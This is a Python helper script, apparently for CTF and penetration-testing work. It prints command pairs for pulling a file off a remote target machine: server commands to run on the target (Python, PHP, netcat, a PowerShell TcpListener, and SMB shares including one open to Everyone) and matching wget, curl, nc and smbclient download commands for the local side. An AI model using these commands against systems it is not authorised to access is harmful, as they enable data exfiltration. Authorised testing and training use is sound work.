#!/usr/bin/env python3
"""
remote_fetch.py
---------------
Companion to serve_local.sh for the REVERSE flow:
  - Generates a command to start an HTTP server on the REMOTE machine.
  - Generates a command to download the file from remote to LOCAL.

Usage:
  python3 remote_fetch.py
  python3 remote_fetch.py --ip 10.10.10.5 --port 8000 --file /tmp/loot.txt --os linux
"""

import argparse
import sys
import urllib.parse

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
B  = "\033[0;34m"
C  = "\033[0;36m"
M  = "\033[0;35m"
W  = "\033[0;37m"
# Bright variants
BR = "\033[1;31m"
BG = "\033[1;32m"
BY = "\033[1;33m"
BB = "\033[1;34m"
BM = "\033[1;35m"
BC = "\033[1;36m"
BO = "\033[1m"
DIM = "\033[2m"
NC = "\033[0m"

BANNER = f"""{BO}{BC}
  ____                      _       _____    _       _
 |  _ \\ ___ _ __ ___   ___ | |_ ___|  ___|__| |_ ___| |__
 | |_) / _ \\ '_ ` _ \\ / _ \\| __/ _ \\ |_ / _ \\ __/ __| '_ \\
 |  _ <  __/ | | | | | (_) | ||  __/  _|  __/ || (__| | | |
 |_| \\_\\___|_| |_| |_|\\___/ \\__\\___|_|  \\___|\\__\\___|_| |_|
{NC}{BM}  Generate remote-serve + local-download command pairs{NC}
  Companion to {BG}serve_local.sh{NC} | CTF / Pentest helper
"""

# ── Helpers ───────────────────────────────────────────────────────────────────

def url_encode(s: str) -> str:
    """Minimal URL encoding compatible with curl/wget/certutil."""
    return s.replace("%", "%25").replace("#", "%23").replace(" ", "%20")


def prompt(label: str, default: str = "") -> str:
    default_hint = f" {DIM}[Enter for {BG}{default}{NC}{DIM}]{NC}" if default else ""
    sys.stdout.write(f"\n{BY}👉 {label}{default_hint}\n{BC}❯ {NC}")
    sys.stdout.flush()
    val = input().strip()
    return val if val else default


def choose(label: str, options: list[tuple[str, str]]) -> str:
    """Show a numbered menu, return the chosen key."""
    print(f"\n{BM}📋 {label}{NC}")
    for i, (key, desc) in enumerate(options, 1):
        print(f"  [{BC}{i}{NC}] {BO}{key}{NC} {DIM}— {desc}{NC}")
    while True:
        sys.stdout.write(f"\n{BY}👉 Enter number: {NC}")
        sys.stdout.flush()
        raw = input().strip()
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw) - 1][0]
        print(f"{BR}❌ Invalid. Enter a number between 1 and {len(options)}.{NC}")


def section(title: str):
    width = 56
    bar = "═" * width
    print(f"\n{BC}╔{bar}╗{NC}")
    print(f"{BC}║{NC}  {BO}{title}{NC}")
    print(f"{BC}╚{bar}╝{NC}")


# ── Command generators ────────────────────────────────────────────────────────

def remote_serve_commands(remote_os: str, port: int, directory: str) -> list[tuple[str, str, str]]:
    """
    Returns a list of (label, command, protocol) triples for starting a server
    on the remote machine.
    """
    cmds = []
    dir_arg = directory if directory else "."

    if remote_os == "linux":
        cmds += [
            ("Python3 HTTP (built-in)", f"cd {dir_arg} && python3 -m http.server {port}", "http"),
            ("Python2 HTTP (built-in)", f"cd {dir_arg} && python2 -m SimpleHTTPServer {port}", "http"),
            ("PHP HTTP (if installed)", f"cd {dir_arg} && php -S 0.0.0.0:{port}", "http"),
            ("Ruby HTTP (if installed)", f"cd {dir_arg} && ruby -run -e httpd . -p {port}", "http"),
            ("Busybox HTTP (if installed)", f"cd {dir_arg} && busybox httpd -f -p {port}", "http"),
            ("Netcat (Raw TCP - Fast!)", f"cd {dir_arg} && nc -lp {port} < \"$FILE\"", "nc"),
            ("Python3 FTP (requires pyftpdlib)", f"python3 -m pyftpdlib -p {port} -d {dir_arg}", "ftp"),
            ("Impacket SMB (requires impacket)", f"impacket-smbserver -smb2support loot {dir_arg}", "smb"),
        ]
    elif remote_os == "windows":
        cmds += [
            ("Python3 HTTP (built-in)", f"cd /d {dir_arg} && python -m http.server {port}", "http"),
            ("PHP HTTP (if installed)", f"cd /d {dir_arg} && php -S 0.0.0.0:{port}", "http"),
            ("PowerShell HTTP (No-Admin)",
             f"$l=[Net.Sockets.TcpListener]{port};$l.Start();while($true){{$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object byte[] 1024;$n=$s.Read($b,0,1024);$req=[Text.Encoding]::ASCII.GetString($b,0,$n);$f=Join-Path '{dir_arg}' ($req.Split(' ')[1].TrimStart('/'));if(Test-Path $f){{$data=[IO.File]::ReadAllBytes($f);$h=\"HTTP/1.1 200 OK`r`nContent-Length: $($data.Length)`r`n`r`n\";$hb=[Text.Encoding]::ASCII.GetBytes($h);$s.Write($hb,0,$hb.Length);$s.Write($data,0,$data.Length)}};$c.Close()}}", "http"),
            ("Netcat (Raw TCP - Fast!)", f"Get-Content \"$FILE\" -Raw | .\\nc64.exe -lp {port}", "nc"),
            ("Netcat (CMD fallback)", f"cmd /c '.\\nc64.exe -lp {port} < \"$FILE\"'", "nc"),
            ("Native SMB Share (Admin)", f"New-SmbShare -Name 'loot' -Path '{dir_arg}' -FullAccess 'Everyone'", "smb"),
        ]
    return cmds


def local_download_commands(remote_ip: str, port: int, filename: str, proto: str) -> list[tuple[str, str]]:
    """
    Returns (label, command) pairs for downloading the file locally based on protocol.
    """
    enc = url_encode(filename)
    url = f"http://{remote_ip}:{port}/{enc}"
    
    if proto == "http":
        return [
            ("wget", f'wget -q --show-progress -O "{filename}" "{url}"'),
            ("curl", f'curl -fsSL "{url}" -o "{filename}"'),
        ]
    elif proto == "nc":
        return [
            ("netcat", f"nc {remote_ip} {port} > \"{filename}\""),
        ]
    elif proto == "smb":
        return [
            ("smbclient", f"smbclient //[{remote_ip}]/loot -c 'get \"{filename}\" \"{filename}\"'"),
            ("mount", f"sudo mount -t cifs //[{remote_ip}]/loot /mnt -o guest && cp /mnt/\"{filename}\" ."),
        ]
    elif proto == "ftp":
        return [
            ("wget (ftp)", f"wget --no-passive-ftp ftp://{remote_ip}:{port}/\"{filename}\""),
            ("curl (ftp)", f"curl -u anonymous:anonymous ftp://{remote_ip}:{port}/\"{filename}\" -o \"{filename}\""),
        ]
    return []


# ── Main ──────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Generate remote-serve + local-download command pairs.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Run without arguments for interactive mode."
    )
    p.add_argument("--ip",   help="Remote machine IP address")
    p.add_argument("--port", help="Port to serve on (default: 8000)", type=int, default=None)
    p.add_argument("--file", help="Full path to the file on the remote (e.g. /tmp/loot.txt)")
    p.add_argument("--os",   help="Remote OS: linux or windows", choices=["linux", "windows"])
    return p.parse_args()


def main():
    print(BANNER)
    args = parse_args()

    # ── Gather inputs ──────────────────────────────────────────────────────
    remote_ip = args.ip or prompt("🌐 Remote machine IP / hostname", "")
    if not remote_ip:
        print(f"{BR}🚨 ERROR: IP address is required.{NC}")
        sys.exit(1)

    while True:
        port_input = prompt("🚪 Port to host on the remote", "8000")
        if port_input.isdigit():
            port = int(port_input)
            break
        print(f"{BR}❌ ERROR: Port must be a number (e.g., 8000). You entered: '{port_input}'{NC}")

    remote_filepath = args.file or prompt("📄 Full path to file on remote (e.g. /tmp/secret.txt)", "")
    if not remote_filepath:
        print(f"{BR}🚨 ERROR: File path is required.{NC}")
        sys.exit(1)

    # Split path → directory + filename
    if "/" in remote_filepath:
        parts = remote_filepath.rsplit("/", 1)
        remote_dir, remote_filename = (parts[0] or "/"), parts[1]
    elif "\\" in remote_filepath:
        parts = remote_filepath.rsplit("\\", 1)
        remote_dir, remote_filename = (parts[0] or "C:\\"), parts[1]
    else:
        remote_dir, remote_filename = ".", remote_filepath

    remote_os = args.os or choose(
        "Target machine OS:",
        [("linux", "🐧 Linux / Unix"), ("windows", "🪟 Windows")]
    )

    # ── Print: Start server on remote ─────────────────────────────────────
    section("STEP 1 — Run on the REMOTE machine")
    serve_cmds = remote_serve_commands(remote_os, port, remote_dir)
    print(f"  {DIM}(Pick one based on what is available on the remote target){NC}\n")
    for label, cmd, proto in serve_cmds:
        # Inject the actual filename into the command if it uses the $FILE placeholder
        final_cmd = cmd.replace("$FILE", remote_filename)
        print(f"  {BM}▶ {BO}{label}{NC}")
        print(f"    {BC}{final_cmd}{NC}\n")

    # ── Print: Download locally ────────────────────────────────────────────
    section("STEP 2 — Run on YOUR (local) machine")
    # Show ALL download options for the protocols offered in Step 1
    # We'll group them by protocol for clarity
    seen_protos = set(s[2] for s in serve_cmds)
    for proto in seen_protos:
        dl_cmds = local_download_commands(remote_ip, port, remote_filename, proto)
        if dl_cmds:
            proto_label = proto.upper() if proto != "nc" else "Netcat"
            print(f"  {BO}{proto_label} Options:{NC}")
            for label, cmd in dl_cmds:
                print(f"    {BM}▶ {label}{NC}")
                print(f"      {BC}{cmd}{NC}")
            print()


    # ── Summary box ────────────────────────────────────────────────────────
    print(f"{BG}{'━' * 58}{NC}")
    print(f"  {BO}🌐 Remote:{NC}     {BY}{remote_ip}:{port}{NC}")
    print(f"  {BO}📄 File:{NC}       {BY}{remote_filepath}{NC}")
    print(f"  {BO}📥 Local save:{NC} {BY}./{remote_filename}{NC}")
    print(f"{BG}{'━' * 58}{NC}\n")


if __name__ == "__main__":
    main()
